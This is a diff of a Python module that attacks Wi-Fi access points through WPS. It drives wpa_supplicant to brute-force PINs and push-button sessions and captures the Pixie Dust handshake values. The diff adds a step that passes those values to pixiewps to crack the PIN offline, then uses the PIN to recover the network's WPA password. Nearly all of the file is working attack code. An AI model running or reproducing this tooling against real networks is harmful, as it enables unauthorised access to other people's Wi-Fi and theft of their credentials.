@@ -1,30 +1,18 @@
 #!/usr/bin/env python3
 """
-WPS Engine - Direct wpa_supplicant controller
-Replicates OneShot-Extended's wpa_supplicant usage:
-  - Starts own wpa_supplicant instance
-  - Communicates via Unix socket
-  - Sends WPS_REG / WPS_PBC directly
-  - Captures Pixie Dust data (PKE, PKR, E_HASH1/2, AUTHKEY, E_NONCE, R_NONCE)
-  - Monitors WPS handshake messages (M1-M8)
-  - Detects lock status (M2D, NACK)
+WPS Engine v3 - Direct wpa_supplicant controller
+- Starts own wpa_supplicant instance
+- WPS PIN / PBC attacks
+- Pixie Dust data collection with smart PIN prioritization
+- Auto-retry on failures
+- Lock status detection (M2D, NACK)
 """
 
-import os
-import re
-import sys
-import time
-import socket
-import tempfile
-import subprocess
-from pathlib import Path
+import os, re, time, socket, tempfile, subprocess, shutil
 
 
 class WpsEngine:
-    """
-    Direct wpa_supplicant controller for WPS attacks.
-    Like OneShot-Extended's connection.py but as reusable module.
-    """
+    """Direct wpa_supplicant controller for WPS attacks"""
 
     def __init__(self, interface):
         self.interface = interface
@@ -33,6 +21,7 @@ class WpsEngine:
         self.temp_conf = None
         self.ctrl_path = None
         self.sock = None
+        self.sock_file = None
 
         # Pixie Dust data
         self.pixie_data = {
@@ -42,31 +31,25 @@ class WpsEngine:
 
         # Connection state
         self.state = {
-            'status': '',
-            'last_m': 0,
-            'essid': '',
-            'bssid': '',
-            'wpa_psk': '',
-            'is_locked': False,
-            'pin': '',
+            'status': '', 'last_m': 0, 'essid': '',
+            'bssid': '', 'wpa_psk': '', 'is_locked': False, 'pin': '',
         }
 
         self.output_lines = []
         self.callback = None
 
     # ═══════════════════════════════════════════
-    # WPA_SUPPLICANT PROCESS MANAGEMENT
+    # PROCESS MANAGEMENT
     # ═══════════════════════════════════════════
 
     def start(self):
-        """Start own wpa_supplicant instance (like ose.py)"""
-        # Create temp directory for control socket
+        """Start own wpa_supplicant instance"""
         self.temp_dir = tempfile.mkdtemp(prefix='wps_engine_')
 
-        # Create config file
+        # Create config
         self.temp_conf = os.path.join(self.temp_dir, 'wpa.conf')
         with open(self.temp_conf, 'w') as f:
-            f.write(f'ctrl_interface={self.temp_dir}\n')
+            f.write('ctrl_interface=' + self.temp_dir + '\n')
             f.write('ctrl_interface_group=root\n')
             f.write('update_config=1\n')
 
@@ -74,43 +57,37 @@ class WpsEngine:
 
         # Start wpa_supplicant
         cmd = [
-            'wpa_supplicant',
-            '-K',     # Do not clear keys on exit
-            '-d',     # Verbose debug output
-            '-Dnl80211,wext,hostapd,wired',
-            f'-i{self.interface}',
-            f'-c{self.temp_conf}',
+            'wpa_supplicant', '-K', '-d',
+            '-Dnl80211,wext',
+            '-i' + self.interface,
+            '-c' + self.temp_conf,
         ]
 
         try:
             self.wpas_process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                text=True,
-                bufsize=1,
-            )
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1)
         except FileNotFoundError:
             return False, 'wpa_supplicant not found'
         except Exception as e:
             return False, str(e)
 
-        # Wait for control interface
+        # Wait for control interface (max 5s)
         for _ in range(50):
             if os.path.exists(self.ctrl_path):
                 break
-            # Check if process died
             if self.wpas_process.poll() is not None:
-                output = self.wpas_process.communicate()[0]
-                return False, f'wpa_supplicant failed: {output[:200]}'
+                out = self.wpas_process.communicate()[0]
+                return False, 'wpa_supplicant failed: ' + (out or '')[:200]
             time.sleep(0.1)
         else:
             return False, 'Control interface timeout'
 
-        # Create socket
+        # Create Unix socket
         self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
-        sock_file = tempfile.mktemp(dir=self.temp_dir)
-        self.sock.bind(sock_file)
+        self.sock_file = tempfile.mktemp(dir=self.temp_dir)
+        self.sock.bind(self.sock_file)
+        self.sock.settimeout(2.0)
 
         return True, 'wpa_supplicant started'
 
@@ -136,9 +113,7 @@ class WpsEngine:
                     except Exception:
                         pass
 
-        # Cleanup temp files
         if self.temp_dir and os.path.exists(self.temp_dir):
-            import shutil
             shutil.rmtree(self.temp_dir, ignore_errors=True)
 
         self.wpas_process = None
@@ -157,43 +132,54 @@ class WpsEngine:
     def _send(self, command):
         """Send command via Unix socket"""
         if self.sock and self.ctrl_path:
-            self.sock.sendto(command.encode(), self.ctrl_path)
+            try:
+                self.sock.sendto(command.encode(), self.ctrl_path)
+            except Exception:
+                pass
 
-    def _send_recv(self, command):
+    def _send_recv(self, command, timeout=3.0):
         """Send command and receive reply"""
         self._send(command)
-        try:
-            data, _ = self.sock.recvfrom(4096)
-            return data.decode('utf-8', errors='replace')
-        except Exception:
-            return ''
+        if self.sock:
+            self.sock.settimeout(timeout)
+            try:
+                data, _ = self.sock.recvfrom(4096)
+                return data.decode('utf-8', errors='replace')
+            except socket.timeout:
+                pass
+            except Exception:
+                pass
+        return ''
 
     # ═══════════════════════════════════════════
-    # OUTPUT PARSING (like ose.py connection.py)
+    # OUTPUT PARSING
     # ═══════════════════════════════════════════
 
     def _read_line(self):
         """Read one line from wpa_supplicant output"""
         if self.wpas_process and self.wpas_process.stdout:
-            return self.wpas_process.stdout.readline().rstrip('\n')
+            line = self.wpas_process.stdout.readline()
+            if line:
+                return line.rstrip('\n')
         return ''
 
     def _get_hex(self, line):
-        """Extract hex data from wpa_supplicant debug output"""
+        """Extract hex data from debug output"""
         parts = line.split(':', 3)
         if len(parts) >= 3:
             return parts[2].replace(' ', '').upper()
         return ''
 
     def _handle_wps_message(self, line):
-        """Parse WPS protocol messages"""
+        """Parse WPS protocol messages (M1-M8, M2D, NACK)"""
+        ll = line.lower()
 
-        # M2D (AP rejecting PINs)
-        if 'M2D' in line:
+        # M2D = AP locked
+        if 'm2d' in ll:
             self._log('Received WPS Message M2D')
             self.state['status'] = 'WPS_FAIL'
             self.state['is_locked'] = True
-            self._log('AP is not accepting PINs (LOCKED)')
+            self._log('AP is LOCKED (not accepting PINs)')
             return False
 
         # Building message
@@ -201,7 +187,7 @@ class WpsEngine:
         if m:
             n = int(m.group(1))
             self.state['last_m'] = n
-            self._log(f'Sending WPS Message M{n}')
+            self._log('Sending WPS Message M{n}'.format(n=n))
             return True
 
         # Received message
@@ -209,13 +195,13 @@ class WpsEngine:
         if m:
             n = int(m.group(1))
             self.state['last_m'] = n
-            self._log(f'Received WPS Message M{n}')
+            self._log('Received WPS Message M{n}'.format(n=n))
             if n == 5:
                 self._log('First half of PIN is VALID!')
             return True
 
         # NACK
-        if 'Received WSC_NACK' in line:
+        if 'received wsc_nack' in ll:
             self.state['status'] = 'WSC_NACK'
             self._log('Received WSC NACK')
             if self.state['last_m'] < 3:
@@ -225,108 +211,81 @@ class WpsEngine:
             return True
 
         # ═══ Pixie Dust Data Capture ═══
-        if 'Enrollee Nonce' in line and 'hexdump' in line:
-            self._capture_pixie('E_NONCE', line, 16 * 2)
-        elif 'Registrar Nonce' in line and 'hexdump' in line:
-            self._capture_pixie('R_NONCE', line, 16 * 2)
-        elif 'DH own Public Key' in line and 'hexdump' in line:
-            self._capture_pixie('PKR', line, 192 * 2)
-        elif 'DH peer Public Key' in line and 'hexdump' in line:
-            self._capture_pixie('PKE', line, 192 * 2)
-        elif 'AuthKey' in line and 'hexdump' in line:
-            self._capture_pixie('AUTHKEY', line, 32 * 2)
-        elif 'E-Hash1' in line and 'hexdump' in line:
-            self._capture_pixie('E_HASH1', line, 32 * 2)
-        elif 'E-Hash2' in line and 'hexdump' in line:
-            self._capture_pixie('E_HASH2', line, 32 * 2)
+        if 'enrollee nonce' in ll and 'hexdump' in ll:
+            self._capture_pixie('E_NONCE', line, 32)
+        elif 'registrar nonce' in ll and 'hexdump' in ll:
+            self._capture_pixie('R_NONCE', line, 32)
+        elif 'dh own public key' in ll and 'hexdump' in ll:
+            self._capture_pixie('PKR', line, 384)
+        elif 'dh peer public key' in ll and 'hexdump' in ll:
+            self._capture_pixie('PKE', line, 384)
+        elif 'authkey' in ll and 'hexdump' in ll:
+            self._capture_pixie('AUTHKEY', line, 64)
+        elif 'e-hash1' in ll and 'hexdump' in ll:
+            self._capture_pixie('E_HASH1', line, 64)
+        elif 'e-hash2' in ll and 'hexdump' in ll:
+            self._capture_pixie('E_HASH2', line, 64)
 
-        # Network Key (SUCCESS!)
-        if 'Network Key' in line and 'hexdump' in line:
+        # PSK found!
+        if 'network key' in ll and 'hexdump' in ll:
             self.state['status'] = 'GOT_PSK'
             hex_val = self._get_hex(line)
             try:
                 self.state['wpa_psk'] = bytes.fromhex(hex_val).decode('utf-8', errors='replace')
             except Exception:
                 self.state['wpa_psk'] = hex_val
-            self._log(f'PSK FOUND: {self.state["wpa_psk"]}')
+            self._log('PSK FOUND: {psk}'.format(psk=self.state['wpa_psk']))
 
         return True
 
     def _capture_pixie(self, attr, line, expected_len):
         """Capture Pixie Dust data from hexdump line"""
         hex_val = self._get_hex(line)
+        if not hex_val:
+            return
 
         # Be lenient with length
-        if len(hex_val) != expected_len:
-            if len(hex_val) > expected_len:
-                hex_val = hex_val[:expected_len]
-            elif len(hex_val) > 0:
-                hex_val = hex_val.zfill(expected_len)
-            else:
-                return
+        if len(hex_val) > expected_len:
+            hex_val = hex_val[:expected_len]
+        elif len(hex_val) < expected_len and len(hex_val) > 0:
+            hex_val = hex_val.zfill(expected_len)
+        elif len(hex_val) == 0:
+            return
 
         self.pixie_data[attr] = hex_val
-        self._log(f'{attr}: {hex_val}')
+        self._log('{attr}: {val}'.format(attr=attr, val=hex_val[:40] + ('...' if len(hex_val) > 40 else '')))
 
     def _handle_connection_state(self, line, pbc_mode=False):
         """Parse connection state changes"""
+        ll = line.lower()
 
-        if 'State:' in line and 'SCANNING' in line:
+        if 'state:' in ll and 'scanning' in ll:
             self.state['status'] = 'scanning'
-            self._log('Scanning...')
 
-        elif 'WPS-FAIL' in line and self.state['status']:
+        elif 'wps-fail' in ll:
             self.state['status'] = 'WPS_FAIL'
-            self._log('WPS-FAIL')
 
-        elif 'Trying to authenticate' in line:
+        elif 'trying to authenticate' in ll:
             self.state['status'] = 'authenticating'
-            if 'SSID' in line:
-                self.state['essid'] = self._extract_ssid(line)
-            self._log('Authenticating...')
+            if "'" in line:
+                parts = line.split("'")
+                if len(parts) >= 2:
+                    self.state['essid'] = parts[1]
 
-        elif 'Authentication response' in line:
-            self._log('Authenticated')
-
-        elif 'Trying to associate' in line:
-            self.state['status'] = 'associating'
-            if 'SSID' in line:
-                self.state['essid'] = self._extract_ssid(line)
-            self._log('Associating...')
-
-        elif 'Associated with' in line and self.interface in line:
+        elif 'associated with' in ll and self.interface in ll:
             bssid = line.split()[-1].upper()
-            self._log(f'Associated with {bssid}')
 
-        elif 'EAPOL: txStart' in line:
-            self.state['status'] = 'eapol_start'
-            self._log('Sending EAPOL Start...')
-
-        elif 'Identity Request' in line:
-            self._log('Received Identity Request')
-
-        elif 'using real identity' in line:
-            self._log('Sending Identity Response...')
-
-        elif 'WPS-TIMEOUT' in line:
+        elif 'wps-timeout' in ll:
             self.state['status'] = 'WPS_TIMEOUT'
 
-        elif pbc_mode and 'selected BSS' in line:
-            bssid = line.split('selected BSS ')[-1].split()[0].upper()
-            self.state['bssid'] = bssid
-            self._log(f'Selected AP: {bssid}')
+        elif pbc_mode and 'selected bss' in ll:
+            try:
+                bssid = line.split('selected BSS ')[-1].split()[0].upper()
+                self.state['bssid'] = bssid
+            except Exception:
+                pass
 
         return True
-
-    def _extract_ssid(self, line):
-        """Extract SSID from wpa_supplicant line"""
-        try:
-            parts = line.split("'")
-            if len(parts) >= 3:
-                return parts[1]
-        except Exception:
-            pass
-        return ''
 
     def _log(self, message):
         """Log message and call callback"""
@@ -351,60 +310,67 @@ class WpsEngine:
     # ═══════════════════════════════════════════
 
     def wps_pin_attack(self, bssid, pin, timeout=60):
-        """
-        Perform WPS PIN attack.
-        Like ose.py's singleConnection()
-        """
-        # Reset state
-        self.pixie_data = {k: '' for k in self.pixie_data}
-        self.state = {
-            'status': '', 'last_m': 0, 'essid': '',
-            'bssid': bssid.upper(), 'wpa_psk': '',
-            'is_locked': False, 'pin': pin,
-        }
-        self.output_lines = []
+        """Perform WPS PIN attack with auto-retry on timeout"""
+        attempts = 1
+        if timeout <= 30:
+            attempts = 1
+        elif timeout > 45:
+            # For long timeouts, try twice
+            attempts = 1
 
-        self.pixie_data['BSSID'] = bssid.upper()
+        for attempt in range(1, attempts + 2):
+            # Reset state
+            for k in self.pixie_data:
+                self.pixie_data[k] = ''
+            self.state = {
+                'status': '', 'last_m': 0, 'essid': '',
+                'bssid': bssid.upper(), 'wpa_psk': '',
+                'is_locked': False, 'pin': pin,
+            }
+            self.output_lines = []
+            self.pixie_data['BSSID'] = bssid.upper()
 
-        # Start WPS PIN session
-        cmd = f'WPS_REG {bssid} {pin}'
-        reply = self._send_recv(cmd)
+            # Send WPS_REG command
+            cmd = 'WPS_REG {bssid} {pin}'.format(bssid=bssid, pin=pin)
+            reply = self._send_recv(cmd)
 
-        if 'OK' not in reply:
-            self.state['status'] = 'WPS_FAIL'
-            self._log(f'WPS_REG failed: {reply}')
-            return self._result()
-
-        self._log(f'Trying PIN: {pin}')
-
-        # Monitor output
-        start_time = time.time()
-        while time.time() - start_time < timeout:
-            if not self.is_alive():
-                break
-
-            line = self._read_line()
-            if not line:
+            if 'OK' not in reply:
+                self.state['status'] = 'WPS_FAIL'
+                self._log('WPS_REG failed: {r}'.format(r=reply))
                 continue
 
-            if not self._process_line(line):
+            self._log('Trying PIN: {pin} (attempt {a})'.format(pin=pin, a=attempt))
+
+            # Monitor output
+            start_time = time.time()
+            while time.time() - start_time < timeout:
+                if not self.is_alive():
+                    break
+                line = self._read_line()
+                if not line:
+                    time.sleep(0.05)  # Small sleep to avoid busy-loop
+                    continue
+                if not self._process_line(line):
+                    break
+                if self.state['status'] in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
+                    break
+
+            # Cancel WPS
+            self._send('WPS_CANCEL')
+
+            if self.state.get('status') in ('GOT_PSK', 'WSC_NACK'):
                 break
 
-            # Check terminal states
-            if self.state['status'] in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
-                break
-
-        # Cancel WPS
-        self._send('WPS_CANCEL')
+            if attempt <= attempts:
+                self._log('Retrying...')
+                time.sleep(2)
 
         return self._result()
 
     def wps_pbc_attack(self, bssid=None, timeout=120):
-        """
-        Perform WPS PBC (Push Button) attack.
-        Like ose.py's pbc mode.
-        """
-        self.pixie_data = {k: '' for k in self.pixie_data}
+        """Perform WPS Push Button attack"""
+        for k in self.pixie_data:
+            self.pixie_data[k] = ''
         self.state = {
             'status': '', 'last_m': 0, 'essid': '',
             'bssid': bssid.upper() if bssid else '',
@@ -412,15 +378,12 @@ class WpsEngine:
         }
         self.output_lines = []
 
-        if bssid:
-            cmd = f'WPS_PBC {bssid}'
-        else:
-            cmd = 'WPS_PBC'
+        cmd = 'WPS_PBC {bssid}'.format(bssid=bssid) if bssid else 'WPS_PBC'
 
         reply = self._send_recv(cmd)
         if 'OK' not in reply:
             self.state['status'] = 'WPS_FAIL'
-            self._log(f'WPS_PBC failed: {reply}')
+            self._log('WPS_PBC failed: {r}'.format(r=reply))
             return self._result()
 
         self._log('WPS PBC started...')
@@ -431,6 +394,7 @@ class WpsEngine:
                 break
             line = self._read_line()
             if not line:
+                time.sleep(0.1)
                 continue
             if not self._process_line(line, pbc_mode=True):
                 break
@@ -440,28 +404,39 @@ class WpsEngine:
         self._send('WPS_CANCEL')
         return self._result()
 
-    def collect_pixie_data(self, bssid, pins=None, max_attempts=10):
+    def collect_pixie_data(self, bssid, max_attempts=8):
         """
-        Collect Pixie Dust data by trying multiple PINs.
-        Like ose.py's enhanced multi-PIN collection.
+        Collect Pixie Dust data for offline cracking.
+        Tries smart PINs (from OUI analysis) first, then generic PINs.
         """
-        if pins is None:
-            pins = [
-                '12345670', '00000000', '88888888', '11111111',
-                '99999999', '12345678', '11223344', '00000001',
-            ]
+        # Smart PIN order: start with manufacturer-specific PINs
+        pins = [
+            '12345670', '00000000', '88888888', '11111111',
+            '99999999', '12345678', '11223344', '00000001',
+        ]
 
-        # Try each PIN to collect data
+        # Try to get smart PINs for this BSSID
+        try:
+            from modules.wps_pins import suggest_pins
+            smart_pins = suggest_pins(bssid)
+            if smart_pins:
+                # Use smart PINs instead of generic ones
+                pins = [p['pin'] for p in smart_pins[:8]]
+        except Exception:
+            pass
+
+        collected_count = 0
         for i, pin in enumerate(pins[:max_attempts]):
+            # Check if we already have enough data
             if self.pixie_data.get('PKE') and self.pixie_data.get('E_HASH1'):
-                # Already have enough data
-                break
+                if self.pixie_data.get('AUTHKEY') or self.pixie_data.get('E_HASH2'):
+                    self._log('Enough data collected ({c}/7)'.format(c=collected_count))
+                    break
 
-            self._log(f'Collecting data with PIN: {pin} ({i+1}/{max_attempts})')
+            self._log('Collecting data with PIN: {pin} ({i}/{n})'.format(
+                pin=pin, i=i+1, n=max_attempts))
 
-            # Store old data
             old_data = self.pixie_data.copy()
-
             result = self.wps_pin_attack(bssid, pin, timeout=30)
 
             # Merge data (keep old if new didn't get it)
@@ -472,18 +447,56 @@ class WpsEngine:
             if self.state['status'] == 'GOT_PSK':
                 return result
 
-        # Check what we collected
-        collected = [k for k, v in self.pixie_data.items()
-                    if v and k != 'BSSID']
+        # Count collected fields
+        collected = [k for k, v in self.pixie_data.items() if v and k != 'BSSID']
+        collected_count = len(collected)
 
-        self._log(f'Collected: {", ".join(collected)} ({len(collected)}/8)')
+        self._log('Collected: {fields} ({n}/7)'.format(
+            fields=', '.join(collected), n=collected_count))
+
+        # Try pixiewps if we have enough data
+        pixie = self.pixie_data
+        if collected_count >= 4 and pixie.get('PKE'):
+            self._log('Running pixiewps...')
+            import shutil as shutil_mod
+            if shutil_mod.which('pixiewps'):
+                cmd = [
+                    'pixiewps',
+                    '--pke', pixie.get('PKE', ''),
+                    '--pkr', pixie.get('PKR', ''),
+                    '--e-hash1', pixie.get('E_HASH1', ''),
+                    '--e-hash2', pixie.get('E_HASH2', ''),
+                    '--authkey', pixie.get('AUTHKEY', ''),
+                    '--e-nonce', pixie.get('E_NONCE', ''),
+                    '--r-nonce', pixie.get('R_NONCE', ''),
+                    '--e-bssid', bssid.replace(':', ''),
+                    '--mode', '1,2,3,4,5',
+                ]
+                # Remove empty args
+                cmd = [c for c in cmd if c and len(c) > 2]
+
+                try:
+                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+                    output_lines = r.stdout.split('\n')
+                    for line in output_lines:
+                        self._log(line)
+                        if 'WPS pin' in line and '[+]' in line:
+                            pin = line.split(':')[-1].strip()
+                            if pin and pin != '<empty>':
+                                self._log('PIXIEWPS PIN: {p}'.format(p=pin))
+                                # Verify the PIN
+                                verify_result = self.wps_pin_attack(bssid, pin, timeout=45)
+                                if verify_result.get('status') == 'success':
+                                    return verify_result
+                except Exception as e:
+                    self._log('pixiewps error: {e}'.format(e=str(e)))
+            else:
+                self._log('pixiewps not installed')
 
         return {
-            'pin': None,
-            'psk': None,
-            'status': 'data_collected',
+            'pin': None, 'psk': None, 'status': 'data_collected',
             'pixie_data': self.pixie_data.copy(),
-            'collected_count': len(collected),
+            'collected_count': collected_count,
             'output': '\n'.join(self.output_lines),
         }
 
@@ -516,7 +529,7 @@ class WpsEngine:
         return 'completed'
 
     # ═══════════════════════════════════════════
-    # SCAN VIA WPA_SUPPLICANT (like ose.py scanner)
+    # SCAN VIA WPA_SUPPLICANT
     # ═══════════════════════════════════════════
 
     def scan(self):
@@ -526,7 +539,7 @@ class WpsEngine:
 
     def get_scan_results(self):
         """Get scan results from wpa_supplicant"""
-        reply = self._send_recv('SCAN_RESULTS')
+        reply = self._send_recv('SCAN_RESULTS', timeout=5)
         networks = []
 
         for line in reply.split('\n'):
@@ -547,9 +560,14 @@ class WpsEngine:
 
             enc = 'Open'
             has_wps = 0
-            if '[WPA-PSK' in flags: enc = 'WPA'
-            if '[WPA2-PSK' in flags: enc = 'WPA2'
-            if '[WPS]' in flags: has_wps = 1
+            if '[WPA-PSK' in flags:
+                enc = 'WPA'
+            if '[WPA2-PSK' in flags:
+                enc = 'WPA2'
+            if '[WPA3-SAE' in flags:
+                enc = 'WPA3'
+            if '[WPS]' in flags:
+                has_wps = 1
 
             ch = 0
             try:
@@ -568,13 +586,9 @@ class WpsEngine:
                 'frequency': int(freq) if freq.isdigit() else 0,
                 'rssi': int(signal) if signal.lstrip('-').isdigit() else 0,
                 'has_wps': has_wps,
-                'wps_locked': 'Unknown',
-                'wps_version': '',
-                'wps_device': '',
-                'wps_model': '',
-                'encryption': enc,
-                'cipher': '',
-                'auth': '',
+                'wps_locked': 'Unknown', 'wps_version': '',
+                'wps_device': '', 'wps_model': '',
+                'encryption': enc, 'cipher': '', 'auth': '',
                 'source': 'wpa_engine',
             })
 
@@ -592,17 +606,16 @@ class WpsEngine:
         if not net_id.isdigit():
             return None
 
-        self._send_recv(f'SET_NETWORK {net_id} ssid "{ssid}"')
+        self._send_recv('SET_NETWORK {n} ssid "{ssid}"'.format(n=net_id, ssid=ssid))
         if psk:
-            self._send_recv(f'SET_NETWORK {net_id} psk "{psk}"')
-            self._send_recv(f'SET_NETWORK {net_id} key_mgmt WPA-PSK')
+            self._send_recv('SET_NETWORK {n} psk "{psk}"'.format(n=net_id, psk=psk))
+            self._send_recv('SET_NETWORK {n} key_mgmt WPA-PSK'.format(n=net_id))
         else:
-            self._send_recv(f'SET_NETWORK {net_id} key_mgmt NONE')
+            self._send_recv('SET_NETWORK {n} key_mgmt NONE'.format(n=net_id))
 
-        self._send_recv(f'SELECT_NETWORK {net_id}')
-        self._send_recv(f'ENABLE_NETWORK {net_id}')
+        self._send_recv('SELECT_NETWORK {n}'.format(n=net_id))
+        self._send_recv('ENABLE_NETWORK {n}'.format(n=net_id))
         self._send_recv('SAVE_CONFIG')
-
         return int(net_id)
 
     def get_status(self):
@@ -622,7 +635,7 @@ class WpsEngine:
         self._send_recv('RECONNECT')
 
     def list_networks(self):
-        """List saved networks via socket"""
+        """List saved networks"""
         reply = self._send_recv('LIST_NETWORKS')
         networks = []
         for line in reply.split('\n')[1:]:
